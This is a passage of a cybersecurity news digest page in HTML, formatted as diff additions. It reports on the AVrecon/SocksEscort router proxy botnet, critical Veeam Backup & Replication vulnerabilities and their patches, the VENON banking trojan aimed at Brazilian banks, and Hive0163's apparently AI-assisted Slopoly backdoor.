+“To get access to the proxy service, customers had to use a payment platform that made it possible to anonymously purchase the service using cryptocurrency. It is estimated that this payment platform received more than EUR 5 million from proxy service customers.”
+SocksEscort was
+powered
+by a malware known as
+AVrecon
+, details of which were publicly documented by Lumen Black Lotus Labs in July 2023. However, it’s assessed to be active since at least May 2021. The proxy service is estimated to have victimized 280,000 distinct IP addresses beginning in early 2025.</p>
+
+<p>In addition to turning an infected device into a SocksEscort residential proxy, AVrecon is equipped to establish a remote shell to an attacker-controlled server and act as a loader by downloading and executing arbitrary payloads. The malware targets approximately 1,200 device models manufactured by Cisco, D-Link, Hikvision, Mikrotik, NETGEAR, TP-Link, and Zyxel. In a statement shared with The Hacker News, a NETGEAR spokesperson said that while some of its devices were reported to be targeted in “early stages of the botnet activity in 2016” in 2016, the company worked quickly to deploy remediation efforts and that there is no indication that its equipment had been exploited since then. “The vast majority of observed devices infected with AVrecon malware are small-office/home-office (SOHO) routers infected using critical vulnerabilities such as Remote Code Execution (RCE) and command injection,” the U.S.</p>
+
+<p>Federal Bureau of Investigation
+said
+in an alert. “AVrecon malware is written in the C language and primarily targets MIPS and ARM devices.”
+To achieve persistence, the threat actors have been observed using the device’s built-in update mechanism to flash a custom firmware image containing a copy of AVrecon, which is hard-coded to execute it on device startup. The modified firmware also disables the device’s update and flashing features, thereby causing the devices to be permanently infected. “This botnet posed a significant threat, as it was marketed exclusively to criminals and composed solely of compromised edge devices,” the Black Lotus Labs team
+said
+.</p>
+
+<p>“Over the past several years, SocksEscort maintained an average size of approximately 20,000 distinct victims weekly, with communications routed through an average of 15 command-and-control nodes (C2s).”
+(The story was updated after publication to include a response from NETGEAR.)
+Found this article interesting? Follow us on
+Google News
+,
+Twitter
+and
+LinkedIn
+to read more exclusive content we post.</p>
+
+<h2 id="veeam-patches-7-critical-backup--replication-flaws-allowing-remote-code-execution"><a id="article-9"></a>Veeam Patches 7 Critical Backup &amp; Replication Flaws Allowing Remote Code Execution</h2>
+
+<p>Veeam has released security updates to address multiple critical vulnerabilities in its Backup &amp; Replication software that, if successfully exploited, could result in remote code execution. The
+vulnerabilities
+are as follows -
+CVE-2026-21666
+(CVSS score: 9.9) - A vulnerability that allows an authenticated domain user to perform remote code execution on the Backup Server. CVE-2026-21667
+(CVSS score: 9.9) - A vulnerability that allows an authenticated domain user to perform remote code execution on the Backup Server. CVE-2026-21668
+(CVSS score: 8.8) - A vulnerability that allows an authenticated domain user to bypass restrictions and manipulate arbitrary files on a Backup Repository.</p>
+
+<p>CVE-2026-21672
+(CVSS score: 8.8) - A vulnerability that allows local privilege escalation on Windows-based Veeam Backup &amp; Replication servers. CVE-2026-21708
+(CVSS score: 9.9) - A vulnerability that allows a Backup Viewer to perform remote code execution as the postgres user. The shortcomings, which affect Veeam Backup &amp; Replication 12.3.2.4165 and all earlier version 12 builds, have been addressed in
+version 12.3.2.4465
+. CVE-2026-21672 and CVE-2026-21708 have also been fixed in
+Backup &amp; Replication 13.0.1.2067
+, along with
+two more critical security flaws
+-
+CVE-2026-21669
+(CVSS score: 9.9) - A vulnerability that allows an authenticated domain user to perform remote code execution on the Backup Server.</p>
+
+<p>CVE-2026-21671
+(CVSS score: 9.1) - A vulnerability that allows an authenticated user with the Backup Administrator role to perform remote code execution in high availability (HA) deployments of Veeam Backup &amp; Replication. “It’s important to note that once a vulnerability and its associated patch are disclosed, attackers will likely attempt to reverse-engineer the patch to exploit unpatched deployments of Veeam software,” the company said in its advisory. With vulnerabilities in Veeam software having been
+repeatedly
+exploited
+by
+threat actors
+to carry out ransomware attacks in the past, it’s essential that users update their instances to the latest version to safeguard against any potential threat. Found this article interesting?</p>
+
+<p>Follow us on
+Google News
+,
+Twitter
+and
+LinkedIn
+to read more exclusive content we post.</p>
+
+<h2 id="rust-based-venon-malware-targets-33-brazilian-banks-with-credential-stealing-overlays"><a id="article-10"></a>Rust-Based VENON Malware Targets 33 Brazilian Banks with Credential-Stealing Overlays</h2>
+
+<p>Cybersecurity researchers have disclosed details of a new banking malware targeting Brazilian users that’s written in Rust, marking a significant departure from other known
+Delphi-based malware families
+associated with the Latin American cybercrime ecosystem. The malware, which is designed to infect Windows systems and was first discovered last month, has been codenamed
+VENON
+by Brazilian cybersecurity company ZenoX. What makes VENON notable is that it shares behaviors that are consistent with established banking trojans targeting the region, such as Grandoreiro, Mekotio, and Coyote, specifically when it comes to features like banking overlay logic, active window monitoring, and a shortcut (LNK) hijacking mechanism. The malware has not been attributed to any previously documented group or campaign.</p>
+
+<p>However, an earlier version of the artifact, dating back to January 2026, has been found to expose full paths from the malware author’s development environment. The paths repeatedly reference a Windows machine username “byst4” (e.g., “C:\Users\byst4...”). “The Rust code structure presents patterns suggesting a developer familiar with the capabilities of existing Latin American banking trojans, but who used generative AI to rewrite and expand these functionalities in Rust, a language that requires significant technical experience to use at the observed level of sophistication,” ZenoX
+said
+. VENON is distributed by means of a sophisticated infection chain that uses DLL side-loading to launch a malicious DLL.</p>
+
+<p>It’s suspected that the campaign leverages social engineering ploys like
+ClickFix
+to trick users into downloading a ZIP archive containing the payloads by means of a PowerShell script. Once the DLL is executed, it performs nine evasion techniques, including anti-sandbox checks, indirect syscalls, ETW bypass, AMSI bypass, before actually initiating any malicious actions. It also reaches out to a Google Cloud Storage URL to retrieve a configuration, install a scheduled task, and establish a WebSocket connection to the command-and-control (C2) server. Also extracted from the DLL are two Visual Basic Script blocks that implement a shortcut hijacking mechanism exclusively targeting the Itaú banking application.</p>
+
+<p>The components work by replacing the legitimate system shortcuts with tampered versions that redirect the victim to a web page under the threat actor’s control. The attack also supports an uninstall step to undo the modifications, suggesting that the operation can be remotely controlled by the operator to restore the shortcuts to what they originally were to cover up the tracks. In all, the banking malware is equipped to target 33 financial institutions and digital asset platforms by monitoring the window title and active browser domain, springing into action only when any of the targeted applications or websites are opened to facilitate credential theft by serving fake overlays. The disclosure comes amid campaigns where threat actors are exploiting the ubiquity of WhatsApp in Brazil to
+distribute
+a worm named SORVEPOTEL via the messaging platform’s desktop web version.</p>
+
+<p>The attack hinges on abusing previously authenticated chats to deliver malicious lures directly to victims, ultimately resulting in the deployment of banking malware such as Maverick, Casbaneiro, or Astaroth. “A single WhatsApp message delivered through a hijacked SORVEPOTEL session was sufficient to draw a victim into a multi-stage chain that ultimately resulted in an Astaroth implant running fully in memory,” Blackpoint Cyber
+said
+. “The combination of local automation tooling, unsupervised browser drivers, and user-writable runtimes created an unusually permissive environment, allowing both the worm and the final payload to establish themselves with minimal friction.”
+Found this article interesting? Follow us on
+Google News
+,
+Twitter
+and
+LinkedIn
+to read more exclusive content we post.</p>
+
+<h2 id="hive0163-uses-ai-assisted-slopoly-malware-for-persistent-access-in-ransomware-attacks"><a id="article-11"></a>Hive0163 Uses AI-Assisted Slopoly Malware for Persistent Access in Ransomware Attacks</h2>
+
+<p>Cybersecurity researchers have disclosed details of a suspected artificial intelligence (AI)-generated malware codenamed
+Slopoly
+put to use by a financially motivated threat actor named
+Hive0163
+. “Although still relatively unspectacular, AI-generated malware such as Slopoly shows how easily threat actors can weaponize AI to develop new malware frameworks in a fraction of the time it used to take,” IBM X-Force researcher Golo Mühr
+said
+in a report shared with The Hacker News. Hive0163’s operations are driven by extortion through large-scale data exfiltration and ransomware. The e-crime group is primarily
+associated
+with a wide range of malicious tools, including NodeSnake, Interlock RAT, JunkFiction loader, and Interlock ransomware.</p>
+
+<p>In one ransomware attack observed by the company in early 2026, the threat actor was observed deploying Slopoly during the post-exploitation phase so as to maintain persistent access to the compromised server for more than a week. Slopoly’s discovery can be traced back to a PowerShell script that’s likely deployed into the “C:\ProgramData\Microsoft\Windows\Runtime" folder by means of a builder. Persistence is achieved by setting up a scheduled task called “Runtime Broker.”
+There are signs that the malware was developed with the help of an as-yet-undetermined large language model (LLM). This includes the presence of extensive comments, logging, error handling, and accurately named variables.</p>
+
+<p>The comments also describe the script as a “Polymorphic C2 Persistence Client,” indicating that it’s part of a command-and-control (C2) framework. “However, the script does not possess any advanced techniques and can hardly be considered polymorphic, since it’s unable to modify its own code during execution,” Mühr noted. “The builder may, however, generate new clients with different randomized configuration values and function names, which is standard practice among malware builders.”
+The PowerShell script functions as a full-fledged backdoor that can beacon a heartbeat message containing system information to a C2 server every 30 seconds, poll for a new command every 50 seconds, execute it via “cmd.exe,” and relay the results back to the server. The exact nature of the commands run on the compromised network is currently unknown.</p>
+
+<p>The attack in itself is said to have leveraged the
+ClickFix
+social engineering tactic to trick the victim into running a PowerShell command, which then downloads NodeSnake, a known malware attributed to Hive0163. A first-stage component, NodeSnake, is designed to run shell commands, establish persistence, and retrieve and launch a wider malware framework referred to as Interlock RAT. Hive0163 has a track record of employing ClickFix and malvertising for initial access. Another method the threat actor uses to establish a foothold is by relying on initial access brokers such as
+TA569
+(aka SocGholish) and
+TAG-124
+(aka KongTuke and LandUpdate808).</p>
+
+<p>The framework has multiple implementations in PowerShell, PHP, C/C++, Java, and JavaScript to support both Windows and Linux. Like NodeSnake, it also communicates with a remote server to fetch commands that allow it to launch a SOCKS5 proxy tunnel, spawn a reverse shell on the infected machine, and deliver more payloads, such as Interlock ransomware and Slopoly. The emergence of Slopoly adds to a growing list of AI-assisted malware, which also includes
+VoidLink
+and
+PromptSpy
+, highlighting how bad actors are using the technology to accelerate malware development and scale their operations. “The introduction of AI-generated malware does not pose a new or sophisticated threat from a technical standpoint,” IBM X-Force said.</p>
+
+<p>“It disproportionately enables threat actors by reducing the time an operator needs to develop and execute an attack.”
+Found this article interesting? Follow us on
+Google News
+,
+Twitter
+and
+LinkedIn
+to read more exclusive content we post.</p>
+
+
+</div> 
+    </main>
+  </div>
+  <script src="/hacker-news-ai-pages/assets/js/main.js"></script>
+</body>
+</html> 
